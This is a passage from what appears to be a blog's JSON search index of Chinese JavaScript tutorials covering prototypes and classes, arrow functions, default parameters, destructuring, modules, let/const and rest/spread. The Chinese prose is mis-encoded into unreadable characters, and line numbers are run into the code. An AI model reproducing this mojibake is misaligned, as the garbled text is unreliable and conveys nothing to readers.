console.log('hi')}const getNameByReference = getName1getName1() // higetName2() // higetNameByReference() // hiconsole.log(getName1 === getName2) // falseconsole.log(getNameByReference === getName1) // true é€™ä¸‰å€‹ function éƒ½å¯ä»¥æ­£å¸¸åŸ·è¡Œï¼Œå¯æ˜¯å·®åœ¨å“ªè£¡ï¼Ÿå·®åœ¨ getName1 å’Œ getName2 æ˜¯ä¸åŒçš„ functionï¼Œè€Œ getNameByReference æ˜¯é€é refer çš„æ–¹å¼åƒè€ƒåˆ° getName1ï¼Œæ‰€ä»¥ getNameByReference === getName1 æ‰æœƒæ˜¯trueã€‚ å›åˆ° prototype çš„ä¾‹å­ä¹Ÿä¸€æ¨£ï¼Œå¦‚æœæ²’æœ‰ç”¨ prototype ä¾†åšè¨­å®šçš„è©±ï¼Œæ¯ç•¶ new ä¸€å€‹ instance çš„æ™‚å€™å°±æœƒé‡æ–°å®£å‘Šä¸€å€‹æ–°çš„ functionï¼Œæ‰€ä»¥æ¯”å°çš„çµæœæœƒæ˜¯ falseï¼Œå› ç‚ºå®ƒå€‘æ˜¯ä¸ä¸€æ¨£çš„ã€‚ å•é¡Œå¾ˆæ˜é¡¯ï¼Œé€™æ¨£å­å¾ˆæµªè²»è³‡æºï¼Œæ˜æ˜æ¯å€‹ function è¦åšçš„äº‹æƒ…ä¸€æ¨£ï¼Œç‚ºä»€éº¼ä¸è®“å®ƒå€‘å…±ç”¨å°±å¥½ï¼Ÿé‚„è¦å¹«æ¯ä¸€å€‹ instance éƒ½é‡æ–°å®£å‘Šä¸€æ¬¡ã€‚ æ‰€ä»¥ prototype å°±èª•ç”Ÿäº†ï¼Œè®“æ¯å€‹ instance å…±ç”¨åŒä¸€å€‹ functionï¼Œå°±æ˜¯å®ƒçš„åˆè¡·ã€‚ è‡³æ–¼åˆ¥äººå¸¸èªª class æ˜¯èªæ³•ç³–çš„åŸå› æ˜¯å› ç‚ºå¯«èµ·ä¾†æ¯”è¼ƒç°¡å–®å’Œç›´è¦ºï¼Œä½ å¯ä»¥æ»‘ä¸Šå»å°æ¯” ES5 å’Œ ES6ï¼Œå°±èƒ½çœ‹åˆ°é€™å…©å€‹å·®åˆ¥ï¼š ç›´æ¥åœ¨ class è£¡ç”¨ constructorï¼Œè€Œä¸æ˜¯é€é function declaration ä¸éœ€è¦é€é prototype ä¾†ç¶å®šï¼Œä¹Ÿèƒ½é”åˆ°ä¸€æ¨£çš„æ•ˆæœ æ‰€ä»¥ç¾åœ¨è¦å¯¦ä½œç‰©ä»¶å°å‘éƒ½æœƒé€é classï¼Œæ¯”è¼ƒå°‘åœ¨ç”¨ prototypeï¼Œä½†é‚„æ˜¯è¦ç†è§£å®ƒå€‘èƒŒå¾Œçš„æ¶µç¾©ã€‚ ç¹¼æ‰¿å…ˆä¾†ä¸€æ®µç¯„ä¾‹ï¼Œè¤‡ç¿’ä¸€ä¸‹åœ¨ ES6 è£¡é¢æˆ‘å€‘æ˜¯æ€éº¼ç”¨ class ä¾†åšç¹¼æ‰¿çš„ã€‚ é™„è¨»ï¼šAdmin æœƒç¹¼æ‰¿ User 12345678910111213141516171819202122232425262728293031323334class User { constructor(name, email) { this.name = name this.email = email } login() { console.log(`${this.name} has logged in.`) }}class Admin extends User { constructor(permission, ...props) { super(...props) this.permission = permission this.users = [] } addUser(user) { this.users = this.users.map((user) =&gt; ({ ...user })).concat(user) } deleteUser(user) { this.users = this.users.filter((u) =&gt; u.name !== user.name) }}const user1 = new User('peanu', 'peanu@peanu.dev')const user2 = new User('ppb', 'ppb@peanu.dev')const admin = new Admin('root', 'admin', 'admin@peanu.dev')admin.login() // admin has logged inadmin.addUser(user1)admin.addUser(user2)console.log('init users', admin.users) // [user1, user2]admin.deleteUser(admin.users[0]) // delete user1console.log('deleted users', admin.users) // user2 ç°¡å–®ä¾†èªªï¼Œåœ¨å»ºç«‹ Admin æ™‚æˆ‘å€‘æœƒå¤šåšå…©ä»¶äº‹ï¼š ç”¨ extends è¡¨ç¤ºæˆ‘å€‘æƒ³è¦ç¹¼æ‰¿çš„é‚£å€‹ classï¼ˆUserï¼‰ ç‚ºäº†å»ºç«‹æ–°çš„ property çµ¦ Adminï¼Œæˆ‘å€‘æœƒåœ¨ constructor ä¸­ä½¿ç”¨ super å»ºç«‹åŸæœ¬ User ä¸­æ‡‰æœ‰çš„ propertyã€‚ï¼ˆå¦‚æœæ²’æœ‰é€™å€‹éœ€æ±‚çš„è©±å…¶å¯¦å¯ä»¥çœç•¥é€™å€‹æ­¥é©Ÿï¼‰ æœ€å¾Œç”¨ Admin å»ºç«‹çš„å‡ºä¾†çš„ Instance å°±æœƒç¹¼æ‰¿ User èº«ä¸Šçš„ property åŠ methodï¼ˆnameã€email å’Œ loginï¼‰ã€‚ å¦‚æœè®Šæˆ ES5 çš„å½¢å¼çš„è©±æœƒæ”¹æˆé€™æ¨£ï¼š 1234567891011121314151617181920212223242526272829303132333435363738function User(name, email) { this.name = name this.email = email}User.prototype.login = function () { console.log(`${this.name} has logged in`)}function Admin(role, ...args) { // æŠŠ this (ç‰©ä»¶ï¼‰ä¸Ÿçµ¦ User constructor å»ºç«‹ property User.apply(this, args) // å»ºç«‹ Admin è‡ªå·±çš„ property this.role = role this.users = []}// ç¹¼æ‰¿ User.prototype ä¸­çš„æ‰€æœ‰ methodAdmin.prototype = Object.create(User.prototype)// åœ¨ Admin.prototype å»ºç«‹è‡ªå·±çš„ methodAdmin.prototype.addUser = function (user) { this.users = this.users.map((user) =&gt; ({ ...user })).concat(user)}Admin.prototype.deleteUser = function (user) { this.users = this.users.filter((u) =&gt; u.name !== user.name)}const user1 = new User('peanu', 'peanu@peanu.dev')const user2 = new User('ppb', 'ppb@peanu.dev')const admin = new Admin('root', 'admin', 'admin@peanu.dev')admin.login() // admin has logged inadmin.addUser(user1)admin.addUser(user2)console.log('added users', admin.users) // [user1, user2]admin.deleteUser(admin.users[0])console.log('deleted users', admin.users) // [user2] æ‹†é–‹èªæ³•ç³–çš„åŒ…è£å¾Œï¼š å»ºç«‹ property çš„æ–¹å¼æœƒå¾ super(...args) è®Šæˆ User.apply(this, args) å»ºç«‹ method çš„æ–¹å¼æœƒå¾ extends User è®Šæˆ Admin.prototype = Object.create(User.prototype) å…¶å¯¦èƒŒå¾Œåœ¨åšçš„äº‹æƒ…éƒ½ä¸€æ¨£ï¼Œåªæ˜¯ ES6 æŠŠå®ƒåŒ…è£æˆæ›´å¥½çœ‹ä¸€é»è€Œå·²ã€‚","link":"/2022/03/18/es5-oop/"},{"title":"ES6 çš„ç®­é ­å‡½å¼","text":"å¯«èµ·ä¾†ç”œç”œçš„ã€‚ å¥½åƒçš„èªæ³•ç³–å…ˆçœ‹åŸå§‹çš„ functionï¼š 12345678910let arr = [1, 2, 3, 4, 5]console.log( arr .filter(function(value) { return value &gt; 1 }) .map(function(value) { return value * 2 })) // &nbsp;[4, 6, 8, 10] å†ä¾†çœ‹ç®­é ­å‡½å¼ï¼š 123456let arr = [1, 2, 3, 4, 5]console.log( arr .filter(value =&gt; value &gt; 1) .map(value =&gt; value * 2)) // &nbsp;[4, 6, 8, 10] ç°¡å–®ç­†è¨˜ä¸€äº›æ³¨æ„äº‹é …ï¼š åªæœ‰ä¸€å€‹åƒæ•¸çš„æ™‚å€™æ‰å¯ä»¥çœç•¥ ()ï¼Œvalue =&gt; value * 2 æ²’æœ‰åƒæ•¸çš„æ™‚å€™ä¸€å®šè¦ ()ï¼Œ() =&gt; console.log('hi') åªè¦åŠ ä¸Š {} å°±ä¸€å®šè¦è‡ªå·±å¯« return æ‰æœƒæœ‰å›å‚³çš„æ•ˆæœï¼Œvalue =&gt; { return value * 2 } this å€¼è·Ÿä¸€èˆ¬çš„ function ä¸ä¸€æ¨£","link":"/2021/12/25/es6-arrow-function/"},{"title":"ES6 çš„é è¨­åƒæ•¸å€¼","text":"å†ä¹Ÿä¸ç”¨æ“”å¿ƒ undefinedã€‚ function çš„ç”¨æ³•å¦‚æœä¸å¹«åƒæ•¸ç”¨ä¸€å€‹é è¨­å€¼çš„è©±ï¼Œå†ç¢°åˆ°ä¸€äº› edge case çš„æ™‚å€™æœƒæ¯”è¼ƒéº»ç…©ä¸€é»ï¼š 12345678function repeat(str, times) { let result = '' for(let i=0; i&lt;times; i++) { result += str } return result}console.log(repeat('a')) // '' ç©ºå­—ä¸² ï¼ˆtimes æœƒæ˜¯ undefined æ‰€ä»¥ä¸æœƒé€²å…¥è¿´åœˆï¼Œæœ€å¾Œå¾—åˆ°ç©ºå­—ä¸²ï¼‰ åŠ ä¸Šé è¨­å€¼ä¸–ç•Œå°±ä¸ä¸€æ¨£äº†ï¼š 12345678function repeat(str = '', times = 1) { let result = '' for(let i=0; i&lt;times; i++) { result += str } return result }console.log(repeat('a')) // a è§£æ§‹çš„ç”¨æ³•åŸä¾†é€™å€‹ç”¨æ³•ä¹Ÿèƒ½æ­é…è§£æ§‹ä¾†ç”¨ï¼š 1234let arr = [1, 2, 3]let [n1, n2, n3=100, n4 = 'abc'] = arrconsole.log(n3) // 3console.log(n4) // 'abc' 12345678let obj = { a: 1, b: 2, c: 3}let {a, b, c=true, d='ddd'} = objconsole.log(c) // 3console.log(d) // 'ddd'","link":"/2021/12/25/es6-default-parameters/"},{"title":"ES6 çš„è§£æ§‹è³¦å€¼","text":"ç›¸è¦‹æ¨æ™šã€‚ éå»å¼ä»¥å¾€åœ¨å° array æˆ– object å–å€¼éƒ½æ˜¯åƒé€™æ¨£ï¼š arrayï¼š 1234const arr = [1, 2, 3]const n1 = arr[0]const n2 = arr[1]const n3 = arr[2] objectï¼š 12345678const obj = { name: 'Peanu', age: 23, address: 'Taiwan',}const name = obj.nameconst age = obj.ageconst address = obj.address ç¾åœ¨å¼è§£æ§‹çš„æ¦‚å¿µå¾ˆç°¡å–®ï¼Œå°±æ˜¯ç”¨ã€Œå°æ‡‰ã€çš„æ–¹å¼ä¾†å–å€¼ï¼Œä¸€å€‹è®Šæ•¸éƒ½æœƒå°æ‡‰åˆ°ä¸€å€‹ key æˆ– valueã€‚ arrayï¼š 12const arr = [1, 2, 3]const [n1, n2, n3] = arr ä½ å¯ä»¥æƒ³æˆæ˜¯é€™æ¨£çš„å°æ‡‰é—œä¿‚ï¼š 1const [n1, n2, n3] = [1, 2, 3] objectï¼š 123456const obj = { name: 'Peanu', age: 23, address: 'Taiwan',}const {name, age, address} = obj ä½ å¯ä»¥æƒ³æˆæ˜¯é€™æ¨£çš„å°æ‡‰é—œä¿‚ï¼š 12345678910const obj = { name: 'Peanu', age: 23, address: 'Taiwan',}const { name age address} = obj æ‡‰è©²å¾ˆç›´è¦ºå§ï¼Ÿ è®“æˆ‘å€‘å±¤å±¤ç›¸ç–Šå¦‚æœè§£æ§‹å‡ºä¾†çš„å€¼æ˜¯ä¸€å€‹ objectï¼Œé‚£ä¸€æ¨£å¯ä»¥å†å°å®ƒè§£æ§‹ï¼š 12345678910111213const obj = { name: 'Peanu', age: 23, address: 'Taiwan', wife: { name: 'PPB', age: 24, address: 'Taiwan', }}const { wife } = objconst { name } = wifeconsole.log(name) // PPB é€²éšï¼ç‰©ä»¶çš„å·¢ç‹€å–å€¼çŸ¥é“ä¸€ä¸‹å°±å¥½ï¼Œå¯¦å‹™ä¸Šæ‡‰è©²æ˜¯ä¸å¸¸é€™æ¨£ç”¨ï¼š 123456789101112const obj = { name: 'Peanu', age: 23, address: 'Taiwan', wife: { name: 'PPB', age: 24, address: 'Taiwan', }}const {wife: {name}} = objconsole.log(name) // PPB çœ‹ä¸æ‡‚çš„è©±ï¼Œæ”¹ç”¨å°æ‡‰çš„é—œä¿‚ä¾†çœ‹æœƒå¥½æ‡‚å¾ˆå¤šï¼š 12345678910111213141516const obj = { name: 'Peanu', age: 23, address: 'Taiwan', wife: { name: 'PPB', age: 24, address: 'Taiwan', }}const { wife: { name }} = objconsole.log(name) // PPB ä½†è¦æ³¨æ„ä¸€ä¸‹ï¼Œé€™ç¨®å·¢ç‹€å–å€¼çš„æ–¹å¼åªèƒ½å–åˆ°æœ€è£¡é¢é‚£å€‹ï¼Œå¦‚æœä½ é€™æ¨£ç”¨çš„è©±æœƒæœ‰éŒ¯èª¤ï¼š 123456789101112const obj = { name: 'Peanu', age: 23, address: 'Taiwan', wife: { name: 'PPB', age: 24, address: 'Taiwan', }}const {wife: {name}} = objconsole.log(wife) // ReferenceError: wife is not defined Array ç•¶ç„¶ä¹Ÿèƒ½é€™æ¨£ç©ï¼š 12const arr = [ 1, 2, [3, 4] ]const [n1, n2, [n3, n4]] = arr åœ¨å‡½å¼ä¸­è§£æ§‹ç•¶ function çš„é æœŸçš„åƒæ•¸æ˜¯ objectï¼Œå¯ä»¥åœ¨å®šç¾©çš„æ™‚å€™å°±å…ˆè§£æ§‹ï¼š 1234567891011function test({name, age, address}) { console.log(name) console.log(age) console.log(address)}let person = { name: 'PeaNu', age: 23, address: 'Taiwan'}test(person) ç•¶ key / value ç›¸ç­‰æ™‚å¯ä»¥ç¸®å¯«1234567const name='peanu', age=20, gender='man';const obj = { name, age, gender}console.log(obj) è§£æ§‹å‡ºä¾†çš„æ±è¥¿å¯ä»¥é‡æ–°å‘½å123456789101112const obj = { name: 'peanu', age: 25, gender: 'man'}// åŸæœ¬çš„const {name, age , gender} = obj// é‡æ–°å‘½åconst {name: peanuName, age: peanuAge , gender: peanuGender} = objconsole.log('A:', name, age , gender)console.log('B:', peanuName, peanuAge , peanuGender) é™£åˆ—çš„æ‡‰ç”¨ï¼šäº¤æ›èˆ‰å€‹çˆ›ä¾‹å­ï¼Œå‡è¨­æ²’æœ‰ä¸‹é›¨ï¼Œæˆ‘å°±åˆé¤åƒç‰›è‚‰éºµï¼Œæ™šé¤åƒå’–å“©é£¯ï¼›åä¹‹å°±å€’éä¾†ã€‚ ä½†é€™å€‹æŠ€å·§æ˜¯é‹ç”¨è®Šæ•¸åç¨±ä¾†æ›¿æ›ï¼Œä¸¦ä¸æ˜¯çœŸæ­£æ„ç¾©ä¸Šçš„é‚£ç¨®äº¤æ›ï¼ˆæ›ä½ç½®ï¼‰ã€‚ 1234567891011121314let isRaining = falsefunction whatDoYouEatToday(condition) { const meals = ['ç‰›è‚‰éºµ', 'å’–å“©é£¯'] // æ²’ä¸‹é›¨ if(!condition) { const [lunch, dinner] = meals console.log(`åˆé¤--&gt;${lunch}ï¼Œæ™šé¤--&gt;${dinner}`) // æœ‰ä¸‹é›¨ } else { const [dinner, lunch] = meals console.log(`åˆé¤--&gt;${lunch}ï¼Œæ™šé¤--&gt;${dinner}`) }}whatDoYouEatToday(isRaining)","link":"/2021/12/24/es6-destructuring/"},{"title":"ES6 çš„æ¨¡çµ„æ©Ÿåˆ¶","text":"å¾ˆäº‚æã€‚ æ‡¶äººåŒ…export åªèƒ½ç”¨è®Šæ•¸æˆ–å‘½åå‡½å¼è¼¸å‡º è¼¸å‡ºè·Ÿå¼•å…¥çš„æ™‚å€™å¯ä»¥å–åˆ¥å å¼•å…¥çš„æ™‚å€™è¦ç”¨ {}ï¼Œã€Œè§£æ§‹ã€çš„æ–¹å¼å–å‡ºï¼ˆå¯ä»¥æƒ³æˆæ±è¥¿éƒ½è¢«ç”¨ç‰©ä»¶åŒ…èµ·ä¾†è¼¸å‡ºï¼‰ export default å¾Œé¢æ¥ä»€éº¼å°±è¼¸å‡ºä»€éº¼ï¼ˆä¸æœƒå¹«ä½ ç”¨ç‰©ä»¶åŒ…èµ·ä¾†ï¼‰ ä¸€å€‹æª”æ¡ˆåªèƒ½æœ‰ä¸€å€‹ default è¼¸å‡º å¼•å…¥çš„æ™‚å€™ä¸ç”¨ {}ï¼Œç›´æ¥è‡ªå®šç¾©åç¨± ä¸å¯ä»¥å–åˆ¥å è£œå……ï¼šè¦åœ¨ Node.js è£¡é¢è·‘çš„è©±è¦è¨˜å¾—åœ¨ package.json è£¡é¢è¨­å®š \"type\": \"module\" æ‰èƒ½æ­£å¸¸åŸ·è¡Œã€‚ è£œå……ï¼šè¦åœ¨ Browser ä¸Šè·‘çš„è©±è¦è¨˜å¾—é€™æ¨£å¯« 1&lt;script type=\"module\"&gt;&lt;/script&gt; å¦å¤–è¦é–‹ Live-server æ‰æœ‰è¾¦æ³•è·‘ï¼Œä¸ç„¶æœƒè¢« CORS æ“‹ä½ã€‚ export ä¸€å€‹ä¸€å€‹è¼¸å‡ºè¼¸å‡ºï¼š 12345// utils.jsexport function add(a, b) { return a + b}export const PI = 3.14159 å¼•å…¥ï¼š 1234// main.jsimport { PI, add } from './utils.js'console.log(PI) // 3.14159 console.log(add(1, 3)) // 4 å¼•å…¥çš„æ™‚å€™ä¹Ÿå¯ä»¥å–åˆ¥çš„åç¨±ï¼š 1234// main.jsimport { add as ffff, PI as AAA } from './utils.js'console.log(AAA) // 3.14159 console.log(ffff(1, 3)) // 4 å¦‚æœä¸€å€‹ä¸€å€‹å¼•å…¥å¤ªéº»ç…©ä¹Ÿå¯ä»¥ç”¨ * ä¸€æ¬¡å¼•å…¥æˆä¸€å€‹ objectï¼š 1234// main.jsimport * as yoooo from './utils.js'console.log(yoooo.PI) // 3.14159 console.log(yoooo.add(1, 3)) // 4 export ç”¨ç‰©ä»¶åŒ…ä½ä¸€èµ·è¼¸å‡ºè¼¸å‡ºï¼š 123456789// utils.jsfunction add(a, b) { return a + b}const PI = 3.14159 export { add, PI} å¼•å…¥ï¼š 1234// main.jsimport { PI, add } from './utils.js'console.log(PI) // 3.14159 console.log(add(1, 3)) // 4 è¼¸å‡ºçš„æ™‚å€™å¯ä»¥å–åˆ¥çš„åç¨±ï¼š 123456789// utils.jsfunction add(a, b) { return a + b}const PI = 3.14159 export { add as addFunction, PI as AAA} åˆ¥å¿˜äº†å¼•å…¥çš„æ™‚å€™ä¹Ÿè¦å°æ‡‰èµ·ä¾†ï¼š 1234// main.jsimport { AAA, addFunction } from './utils.js'console.log(AAA) // 3.14159 console.log(addFunction(1, 3)) // 4 export defaultè¼¸å‡ºä¸€å€‹æ±è¥¿è¼¸å‡ºï¼š 12// utils.jsexport default 'yoyoyo' å¼•å…¥ï¼š 123// main.jsimport abc from './utils'console.log(abc) // yoyoyo è¼¸å‡ºå¤šå€‹æ±è¥¿ï¼ˆç”¨ç‰©ä»¶åŒ…ï¼‰è¼¸å…¥ï¼š 12345678// utils.jsfunction add(a, b) { return a + b}export default { add, ggg : 'hello'} å¼•å…¥ï¼š 1234// main.jsimport cool from './utils'console.log(cool.add(1, 2)) // 3console.log(cool.ggg) // hello","link":"/2021/12/25/es6-import-export/"},{"title":"ES Module çš„ import æŠ€å·§","text":"ç¬¬ä¸€æ¬¡çŸ¥é“é€™æ‹›ï¼ ç°¡è¿°æœ‰æ™‚å€™æœ‰ä¸€ç¨®æª”æ¡ˆæ˜¯åˆ»æ„ç”¨ä¾†ç•¶ä½œç¨‹å¼å…¥å£é»ï¼Œåªè² è²¬å¼•å…¥å…¶ä»–æª”æ¡ˆï¼Œç„¶å¾Œè¼¸å‡ºã€‚ é€™æ™‚å€™å¯èƒ½æœƒé€™æ¨£å¯«ï¼š 123// index.jsimport App from \"./App\"export default App ä½†å…¶å¯¦é‚„å¯ä»¥ç°¡å¯«æˆé€™æ¨£ï¼š 12// index.jsexport { default } from \"./App\" å¾ˆè®šå§ï¼ç›´æ¥æŠŠ import çµ¦çœç•¥æ‰äº†ã€‚","link":"/2022/04/10/es6-import-trick/"},{"title":"ES6 çš„ let èˆ‡ const","text":"é–‹å§‹å¡« ES6 çš„å‘ã€‚ let èˆ‡ const çš„å·®ç•°let åŸºæœ¬ä¸Šè·Ÿ var å¤§è‡´ä¸Šå·®ä¸å¤šï¼Œåªå·®åœ¨ã€Œä½œç”¨åŸŸã€çš„ç¯„åœä¸åŒï¼Œç­‰ä¸€ä¸‹æœƒè§£é‡‹ä»€éº¼æ˜¯ä½œç”¨åŸŸã€‚ const å°±æ¯”è¼ƒä¸ä¸€æ¨£äº†ï¼Œconst çš„æ„æ€æ˜¯ã€ŒConstantã€ï¼ˆå¸¸æ•¸ï¼‰ï¼Œæ‰€ä»¥ç”¨ const å®£å‘Šçš„è®Šæ•¸ã€Œå€¼ä¸æœƒæ”¹è®Šã€ï¼Œè€Œä¸”åœ¨å®£å‘Šçš„æ™‚å€™å°±å¿…é ˆè³¦å€¼ã€‚ï¼ˆç•¢ç«Ÿéƒ½æ˜¯å¸¸æ•¸äº†ï¼Œæ²’æœ‰ç†ç”±å®£å‘Šçš„æ™‚å€™ä¸èƒ½è³¦å€¼ï¼‰ let èˆ‡ const çš„å€å¡Šä½œç”¨åŸŸä»€éº¼æ˜¯ä½œç”¨åŸŸï¼Ÿç°¡å–®ä¾†èªªå°±æ˜¯ä¸€å€‹ã€Œè®Šæ•¸çš„ç”Ÿå­˜ç¯„åœã€ã€‚ä¾‹å¦‚èªª var çš„ä½œç”¨åŸŸå°±æ˜¯åœ¨ function çš„ç¯„åœå…§ï¼š 123456function varScope () { var a = 20 console.log(a)}varScope() // 20console.log(a) // ReferenceError: a is not defined ä½†å…¶å¯¦å¤§éƒ¨åˆ†çš„ç¨‹å¼èªè¨€æ˜¯ä»¥ blockï¼ˆå€å¡Šï¼‰ä¾†åŠƒåˆ†ä½œç”¨åŸŸçš„ï¼Œæ‰€ä»¥ JavaScript ç®—æ˜¯ä¸€å€‹æ¯”è¼ƒç‰¹åˆ¥çš„æ¡ˆä¾‹ã€‚ è€Œ let èˆ‡ const çš„ä½œç”¨åŸŸå°±æ˜¯åœ¨ block çš„ç¯„åœå…§ï¼š 1234567891011function blockScpoe() { if(true) { let a = 10 const b = 20 console.log(a) // 10 console.log(b) // 20 } console.log(a) // ReferenceError: a is not defined console.log(b) // ReferenceError: b is not defined}blockScpoe() å€å¡Šä½œç”¨åŸŸæœ‰ä»€éº¼å¥½è™•ï¼Ÿä½ å¯èƒ½æœƒæƒ³èªªé€™æ¨£å­è·Ÿç”¨ var æœ‰ä»€éº¼å·®å—ï¼Ÿ å…¶å¯¦æ˜¯æœ‰çš„ï¼Œå› ç‚ºä»¥ function ä¾†åšåˆ‡å‰²çš„ä½œç”¨åŸŸç¯„åœæ¯”è¼ƒå¤§ï¼Œæœƒæ¯”è¼ƒå®¹æ˜“æœ‰ã€Œè¡çªã€è·Ÿã€Œäº’ç›¸å¹²æ“¾ã€çš„å•é¡Œï¼Œçœ‹çœ‹é€™å€‹ä¾‹å­ï¼š 123456789function abc() { var count = 0 for(var i=0; i&lt;10; i++) { var count = 'ddd' console.log(count) // ddd } console.log(count) // ddd}abc() å…ˆèªªè²å°ä¸èµ·é€™ä¾‹å­å¯¦åœ¨æœ‰é»çˆ›ï¼Œä¸éæˆ‘æƒ³è¡¨é”çš„æ˜¯å¦‚æœä½ åœ¨ for è£¡é¢ä¹Ÿå‰›å¥½å®£å‘Šä¸€å€‹ã€Œè·Ÿå¤–é¢åŒåç¨±çš„è®Šæ•¸ã€ï¼Œé‚£å°±æœƒä¸å°å¿ƒæŠŠå¤–é¢çš„è®Šæ•¸å€¼çµ¦è¦†å¯«æ‰ã€‚è€Œå¤§éƒ¨åˆ†çš„æƒ…æ³æˆ‘å€‘ä¸æœƒå¸Œæœ›é€™ç¨®äº‹æƒ…ç™¼ç”Ÿã€‚ ä½†å¦‚æœæ˜¯å€å¡Šä½œç”¨åŸŸçš„è©±å°±èƒ½é¿å…æ‰é€™å€‹å•é¡Œç”¢ç”Ÿï¼š 123456789function abc() { var count = 0 for(var i=0; i&lt;10; i++) { let count = 'ddd' console.log(count) // ddd } console.log(count) // 0}abc() æ‰€ä»¥ç‚ºäº†é™ä½é€™ç¨®è¡çªç™¼ç”Ÿï¼Œæœ€å¥½æ˜¯æ”¹ç”¨ let èˆ‡ const æœƒæ˜¯æ¯”è¼ƒå¥½çš„åšæ³•ã€‚","link":"/2021/12/24/es6-let-const/"},{"title":"ES6 å¯¦ä½œç‰©ä»¶å°å‘","text":"ä¿—ç¨±èªæ³•ç³–ã€‚ ç°¡è¿°é™„è¨»ï¼š Class çš„å‘½åæ…£ä¾‹æ˜¯å¤§é ­é–‹é ­ï¼ˆè »é‡è¦çš„ï¼‰ ç”¨ä¾†æ‹¿ç‰©ä»¶å€¼çš„ function ä¸€èˆ¬æœƒç¨±ç‚ºã€Œgetterã€ï¼Œè¨­å€¼å‰‡ç¨±ç‚ºã€Œsetterã€ ç§æœ‰å±¬æ€§ä¸€èˆ¬æœƒåŠ ä¸Š _ å‰ç¶´ä¾†è¡¨ç¤ºï¼Œå‘Šè¨´åˆ¥äººçŸ¥é“æ²’äº‹ä¸è¦äº‚å‹•ã€‚ï¼ˆå› ç‚ºé‚„æ˜¯å¯ä»¥å­˜å–çš„åˆ°ï¼‰ 12345678910111213141516171819class Person { // init constructor (name) { this._name = name; } // getter getName () { console.log(this._name); } // setter changeName (newName) { this._name = newName; }}const person1 = new Person('PeaNu');const person2 = new Person('PPB');person1.getName(); // PeaNuperson2.getName(); // PPB ç‰©ä»¶å°å‘çš„åŸå‰‡å°±æ˜¯ï¼š å…ˆå¯«å¥½æ¨¡æ¿ ç”¨æ¨¡æ¿æŠŠæ±è¥¿ç”Ÿå‡ºä¾†ï¼ˆä¿—ç¨± new ä¸€å€‹ instance å‡ºä¾†ï¼‰ æ‰€ä»¥ä¸Šé¢å¯«äº† Person é€™å€‹æ¨¡æ¿ï¼Œåœ¨é€é new ä¾†æŠŠ instance ç”Ÿå‡ºä¾†ã€‚ é€šå¸¸åœ¨ new çš„æ™‚å€™æœƒå¸Œæœ›èƒ½åšäº›ã€Œåˆå§‹å€¼ã€çš„è¨­å®šï¼Œæ‰€ä»¥å°±æœƒé€é constructorï¼ˆå»ºæ§‹å­ï¼‰ä¾†å®Œæˆã€‚ä½ ä¹Ÿå¯ä»¥æƒ³æˆ new å°±æ˜¯å†å‘¼å« constructor é€™ç¨®æ„Ÿè¦ºã€‚","link":"/2022/03/18/es6-oop/"},{"title":"ES6 çš„å…¶é¤˜é‹ç®—å­","text":"åˆæ˜¯ä½ ã€‚ æŠŠä½ åŒ…èµ·ä¾†â¤è·Ÿ å±•é–‹é‹ç®—å­ 87 åˆ†åƒï¼Œä½†å·®åœ¨å±•é–‹é‹ç®—å­æ˜¯æŠŠ array æˆ– object çµ¦ã€Œæ‹†é–‹ä¾†ã€ï¼Œå…¶é¤˜é‹ç®—å­æ˜¯æŠŠã€Œæ²’æœ‰æ®¼çš„ array æˆ– objectã€çµ¦ã€ŒåŒ…èµ·ä¾†ã€ï¼Œè®Šæˆä¸€å€‹ array æˆ– objectã€‚ ä»€éº¼å«æ²’æœ‰æ®¼çš„ array æˆ– objectï¼Ÿå°±æ˜¯ä½ åœ¨ç”¨ã€Œè§£æ§‹ã€æˆ–æ˜¯ã€Œå‚³åƒæ•¸åˆ° functionã€çš„æ™‚å€™ã€‚ èˆ‰å€‹è§£æ§‹çš„ä¾‹å­ï¼š 123let arr = [1, 2, 3, 4]let [...rest] = arrconsole.log(rest) // [1, 2, 3, 4] ä½ å¯ä»¥æŠŠå®ƒæƒ³åƒæˆé€™æ¨£ 1let [..rest] = 1, 2, 3, 4 æˆ‘çŸ¥é“é€™æ¨£åšçœ‹èµ·ä¾†å¾ˆè„«è¤²å­æ”¾å±ï¼Œä½†åªæ˜¯æ–¹ä¾¿ç†è§£ã€‚å®ƒçš„ç”¨æ³•æ˜¯ã€ŒæŠŠå‰©é¤˜çš„éƒ¨åˆ†çµ¦åŒ…èµ·ä¾†ã€ï¼š 123let arr = [1, 2, 3, 4]let [n1, n2, ...rest] = arrconsole.log(rest) // [3, 4] ä½†è¦æ³¨æ„ï¼Œrest å¿…é ˆæ”¾åœ¨æœ€å¾Œé¢ï¼Œç•¢ç«Ÿå®ƒæ˜¯æŠŠã€Œå‰©ä¸‹ã€çš„æ±è¥¿çµ¦é›†åˆèµ·ä¾†ã€‚ object ä¹Ÿæ˜¯åŒæ¨£çš„æ“ä½œæ–¹å¼ï¼š 12345678let obj = { a: 1, b: 2, c: 3}let {a, ...obj2} = objconsole.log(a) // 1 console.log(obj2) // {b: 2, c: 3} ä¸æ‡‚çš„è©±ï¼Œä¸€æ¨£æƒ³æˆã€Œæ²’æœ‰æ®¼çš„ objectã€å°±å¥½ï¼š 1234let {a, ...obj2} = a: 1, b: 2, c: 3console.log(a) // 1 console.log(obj2) // {b: 2, c: 3} æ­é… functionå‚³åˆ° function è£¡çš„åƒæ•¸å°±å¾ˆåƒã€Œæ²’æœ‰æ®¼çš„ arrayã€ï¼š 12345function add(a, ...rest) { console.log(a) // 1 console.log(rest) // [2, 3, 4]}add(1, 2, 3, 4) // æ²’æœ‰æ®¼çš„ array æ­é…è§£æ§‹ä¾†ç”¨ä¹Ÿè¡Œï¼š 12345function add([a, ...rest]) { console.log(a) // 1 console.log(rest) // [2, 3, 4]}add([1, 2, 3, 4]) // æ”¹æˆè§£æ§‹","link":"/2021/12/25/es6-rest-parameters/"},{"title":"ES6 å±•é–‹é‹ç®—å­","text":"æ‹†æ‹†æ‹†ï¼ å–œæ­¡æ‹†ç¦®ç‰©å—ï¼Ÿå±•é–‹é‹ç®—å­ï¼ˆSpread-Operatorï¼‰ï¼ŒæŠŠæ±è¥¿çµ¦å±•é–‹ï¼Œå¯ä»¥æƒ³åƒæ˜¯æ‹†ç¦®ç‰©çš„é‚£ç¨®æ„Ÿè¦º \\(â€¢ã…‚â€¢)/ åŸæœ¬ä½ åœ¨ä¸€å€‹ array è£¡é¢æ”¾å¦å¤–ä¸€å€‹ array æœƒè®ŠæˆäºŒç¶­ arrayï¼š 123const arr = [1, 2, 3]const arr2 = [4, 5, 6, arr]console.log(arr2) // [4, 5, 6, [1, 2, 3]] 